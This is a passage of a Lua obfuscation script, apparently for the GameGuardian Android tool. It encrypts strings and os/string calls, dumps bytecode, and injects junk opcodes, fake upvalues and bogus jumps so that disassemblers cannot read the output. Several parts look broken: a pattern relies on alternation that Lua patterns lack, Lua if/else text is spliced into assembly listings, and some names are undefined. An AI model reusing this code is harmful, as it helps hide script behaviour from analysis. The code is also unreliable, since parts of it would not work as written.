function encodeos(code)
return 'os[b68405f119("' .. ShaMod(code) ..'")]('
end

function encodestr(code)
return 'string[b68405f119(' .. ShaMod(code) .. ')]('
end

function encvalues(code)
return 'b68405f119("' .. ShaMod(code) .. '")'
end


DATA = DATA:gsub("end", function() return BATMAN end)

DATA = DATA:gsub('%".-(.-)%"', encvalues)
DATA = DATA:gsub("%'.-(.-)%'", encvalues)
DATA = DATA:gsub('%[%[.-(.-)%]%]', encvalues)
DATA = DATA:gsub("gg%.(%a+)%(", encodegg)
DATA = DATA:gsub("string%.(%a+)%(", encodestr)
DATA = DATA:gsub("os%.(%a+)%(", encodeos)

GG = Infinite..lock2..xnxx..AntiLasm..DEC..DATA..Infinite..AntiLasm..lock2..xnxx

B=string.dump(load(GG),true)

tmp = "/sdcard/tmp.obf"

gg.internal2(load(B),tmp)

Lasm = "LOADK v0 CONST[262143]  ; Next OP after LOADKX not EXTRAARG ; garbage\nSETTABUP u0 v18 v116  ; variable v116 out of stack (.maxstacksize = 39 for this func) ; garbage\nMOVE v0 v0\nLOADBOOL v0 0\nTEST v0 0\nNEWTABLE v0 2 0\nLOADNIL v1..v1\nLOADNIL v2..v2\nLEN v2 v0\nEQ 1 v1 v2\nUNM v1 v0\nLEN v2 v0\nGETTABLE v2 v0 v2\nTEST v0 0\nLOADBOOL v0 0\nLOADNIL v1..v1\nUNM v2 v2\nMOD v2 v2 nil\nLEN v2 v0\nEQ 1 v1 v2\nBNOT v3 v0\nCALL v2..v2 v2..v2\nMOVE v0 v0\nLOADBOOL v0 0\nTEST v0 0\nNEWTABLE v0 2 0\nLOADNIL v1..v1\nLOADNIL v2..v2\nLEN v2 v0\nEQ 1 v1 v2\nUNM v1 v0\nLEN v2 v0\nGETTABLE v2 v0 v2\nTEST v0 0\nLOADBOOL v0 0\nLOADNIL v1..v1\nUNM v2 v2\nMOD v2 v2 nil\nLEN v2 v0\nEQ 1 v1 v2\nBNOT v3 v0\nCALL v2..v2 v2..v2\nLOADK v0 CONST[262143]  ; Next OP after LOADKX not EXTRAARG ; garbage\nSETTABUP u0 v18 v116  ; variable v116 out of stack (.maxstacksize = 39 for this func) ; garbage\nMOVE v0 v0\nLOADBOOL v0 0\nTEST v0 0\nNEWTABLE v0 2 0\nLOADNIL v1..v1\nLOADNIL v2..v2\nLEN v2 v0\nEQ 1 v1 v2\nUNM v1 v0\nLEN v2 v0\nGETTABLE v2 v0 v2\nTEST v0 0\nLOADBOOL v0 0\nLOADNIL v1..v1\nUNM v2 v2\nMOD v2 v2 nil\nLEN v2 v0\nEQ 1 v1 v2\nBNOT v3 v0\nCALL v2..v2 v2..v2\nMOVE v0 v0\nLOADBOOL v0 0\nTEST v0 0\nNEWTABLE v0 2 0\nLOADNIL v1..v1\nLOADNIL v2..v2\nLEN v2 v0\nEQ 1 v1 v2\nUNM v1 v0\nLEN v2 v0\nGETTABLE v2 v0 v2\nTEST v0 0\nLOADBOOL v0 0\nLOADNIL v1..v1\nUNM v2 v2\nMOD v2 v2 nil\nLEN v2 v0\nEQ 1 v1 v2\nBNOT v3 v0\nCALL v2..v2 v2..v2\n"
Lasm = Lasm.."\n"

local var_string = "LOADK v0 CONST[262143]  ; Next OP after LOADKX not EXTRAARG ; garbage"
local extra_code = "\nSETTABUP u0 v18 v116  ; variable v116 out of stack (.maxstacksize = 39 for this func) ; garbage\nMOVE v0 v0\nLOADBOOL v0 0\n"

local function complex_concat(str1, str2)
    return str1 .. str2
end

local A = io.open(tmp, "r"):read("*a")

A = A:gsub("\t", ""):gsub(".numparams %d*", ".numparams 250")
A = A:gsub(".is_vararg %d*", ".is_vararg 250"):gsub(".maxstacksize %d*", ".maxstacksize 250")

local aux_var = B:gsub('RETURN  ; garbage', complex_concat(var_string, extra_code))

gg.internal2(load(aux_var), tmp)

local A1 = "Batman"  
local B0 = string.char  -- TMP_CHAR
local C9 = B0(0)  
local D8 = C9:rep(10000)  
local E7 = A1  

local function F6(v1, v2)
    return v1 .. v2
end

local G5 = F6(B0(4, 7, 0, 0, 0), E7)  -- aux_var
local H4 = F6(B0(4, 17, 39, 0, 0), D8)  -- alt_var

B = B:gsub(G5, H4)

local function I3(input, pattern, func)
    return input:gsub(pattern, func)
end

local function J2(input)
    return input:gsub("GETTABUP[^\n]*\n\n", ""):gsub("\n\nGETTABLE[^\n]*", "")
end

B = I3(B, "GETTABUP[^\n]*\n\nGETTABLE[^\n]*", function(x)
    local K1 = J2(x)  -- gettable
    local L0 = x:gsub("\n\nGETTABLE[^\n]*", "")  -- gettabup
    local M9 = "\n\n"  -- enter

    return F6(L0, F6(M9, K1))
end)

    local FakeKey = [[
        .upval u1 "" ; u1
        .upval u9 "" ; u2
        .upval u10 "" ; u3
        .upval u0 "" ; u4
        .upval v0 "" ; u5
        .upval u11 "" ; u6
        .upval u12 "" ; u7
        .upval u13 "" ; u8
        .upval u14 "" ; u9
        .upval u15 "" ; u10
        .upval u16 "" ; u11
    ]]

    local FakeKey1 = [[
        .upval u1 "" ; u1
        .upval u9 "" ; u2
        .upval u10 "" ; u3
        .upval u7 "" ; u4
        .upval u6 "" ; u5
        .upval u11 "" ; u6
    ]]

    B = B:gsub("upval%s*v0*%s*nil%s*;%s*%w*", "upval v0 nil ; u0\n" .. FakeKey, 1)
    B = B:gsub("upval%s*u0*%s*nil%s*;%s*%w*", "upval u0 nil ; u0\n" .. FakeKey1, 1)

    B = B:gsub('RETURN  ; garbage', Lasm)

B = B:gsub("LOADK|GETTABUP", function(op)
    local opjmp = math.random(1, 9999999999)
    local randomOp = math.random(100, 900)
    local randomHex = math.random(1, 900)

    local OBF = "\nJMP :goto_" .. opjmp .. "\n\n" ..
                "if math.random() < 0.5 then\n" ..
                "  OP[" .. randomOp .. "] 0xf3e" .. randomHex .. "\n" ..
                "else\n" ..
                "  OP[" .. randomOp .. "] 0xf3e" .. randomHex .. " -- alternativa\n" ..
                "end\n\n" ..
                ":goto_" .. opjmp .. "\n\n"

    return OBF .. op
end)

B = B:gsub("GETTABLE\nCALL", function(op)
    local opjmp = math.random(1, 9999999999)
    local randomOp = math.random(100, 900)
    local randomHex = math.random(1, 900)

    local OBF = "\nJMP :goto_" .. opjmp .. "\n\n" ..
                "if math.random() < 0.5 then\n" ..
                "  OP[" .. randomOp .. "] 0xf3e" .. randomHex .. "\n" ..
                "else\n" ..
                "  OP[" .. randomOp .. "] 0xf3e" .. randomHex .. " -- alternativa\n" ..
                "end\n\n" ..
                ":goto_" .. opjmp .. "\n\n"

    return OBF .. (op == "GETTABLE" and "GETTABLE" or "CALL")
end)

B=B:gsub("NEWTABLE", function(x)
opjmp = math.random(1,9999999999)
GenOP = "JMP :goto_"..opjmp.."\n\nOP["..math.random(100, 900).."] 0xf3e"..math.random(1, 900).."\n\n:goto_"..opjmp.."\n\n"
return GenOP.."NEWTABLE"
end)

B=B:gsub("SETUPVAL", function(x)
opjmp = math.random(1,9999999999)
GenOP = "JMP :goto_"..opjmp.."\n\nOP["..math.random(100, 900).."] 0xf3e"..math.random(1, 900).."\n\n:goto_"..opjmp.."\n\n"
return GenOP.."SETUPVAL"
end)

B=B:gsub("SETTABUP", function(x)
opjmp = math.random(1,9999999999)
GenOP = "JMP :goto_"..opjmp.."\n\nOP["..math.random(100, 900).."] 0xf3e"..math.random(1, 900).."\n\n:goto_"..opjmp.."\n\n"
return GenOP.."SETTABUP"
end)

B=B:gsub("GETUPVAL", function(x)
opjmp = math.random(1,9999999999)
GenOP = "JMP :goto_"..opjmp.."\n\nOP["..math.random(100, 900).."] 0xf3e"..math.random(1, 900).."\n\n:goto_"..opjmp.."\n\n"
return GenOP.."GETUPVAL"
end)

B=B:gsub("CLOSURE", function(x)
opjmp = math.random(1,9999999999)
GenOP = "JMP :goto_"..opjmp.."\n\nOP["..math.random(100, 900).."] 0xf3e"..math.random(1, 900).."\n\n:goto_"..opjmp.."\n\n"
return GenOP.."CLOSURE"
end)

B=B:gsub("RETURN", function(x)
opjmp = math.random(1,9999999999)
GenOP = "JMP :goto_"..opjmp.."\n\nOP["..math.random(100, 900).."] 0xf3e"..math.random(1, 900).."\n\n:goto_"..opjmp.."\n\n"
return GenOP.."RETURN"
end)

B=B:gsub("SELF", function(x)
opjmp = math.random(1,9999999999)
GenOP = "\nJMP :goto_"..opjmp.."\n\nOP["..math.random(1, 900).."] 0xf3e"..math.random(1, 900).."\n\n:goto_"..opjmp.."\n\n"
return GenOP.."SELF"
end)

B = string.dump(load(B), true, false)

io.open(g.out,"w"):write(B):close()

os.remove("/sdcard/tmp.obf")

alertBatman = '📂 File Saved To: '..g.out..'\n'
gg.alert(alertBatman, '')
return 
end